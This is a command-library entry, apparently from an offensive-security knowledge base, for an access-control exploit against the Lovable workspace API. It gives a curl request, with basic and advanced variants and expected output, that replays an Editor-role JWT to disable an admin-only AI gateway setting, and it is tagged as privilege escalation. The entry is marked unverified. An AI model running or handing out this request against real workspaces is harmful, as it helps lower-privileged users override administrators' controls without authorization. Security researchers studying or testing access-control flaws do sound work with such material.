---
id: cmd-3371448-editor-replay
data: >-
  curl -X POST
  https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable
  -H "Authorization: Bearer <EDITOR_JWT>" -H "Content-Type: application/json" -d
  '{"approval_preference":"disable"}'
tags:
  - api-exploit
  - privilege-escalation
type: command
output: |-
  {
    "success": true,
    "preferences": {
      "ai_gateway": "disabled"
    }
  }
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.414Z'
verified: false
validated: true
submitted: true
---
# replay-editor-toggle

## Command

```bash
curl -X POST https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable \
  -H "Authorization: Bearer <EDITOR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Description

Replays the AI toggle request using an Editor's JWT to exploit broken access control, disabling admin-only features if the bypass succeeds.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<WORKSPACE_ID>` | Target workspace identifier | Yes |
| `<EDITOR_JWT>` | Editor role JWT token | Yes |
| `-d` | Payload to set preference to disable | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://lovable-api.com/workspaces/123/tool-preferences/ai_gateway/enable \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

### Advanced Usage

With silent output and status check:

```bash
curl -s -w "%{http_code}" -X POST https://lovable-api.com/workspaces/123/tool-preferences/ai_gateway/enable \
  -H "Authorization: Bearer <EDITOR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

## Expected Output

If successful, 200 OK with {"success": true}, confirming escalation; otherwise, 403 Forbidden.

## Related

- [[commands/admin-toggle-ai-capture]]
- [[procedures/Access-Admin-Endpoint-as-Editor]]
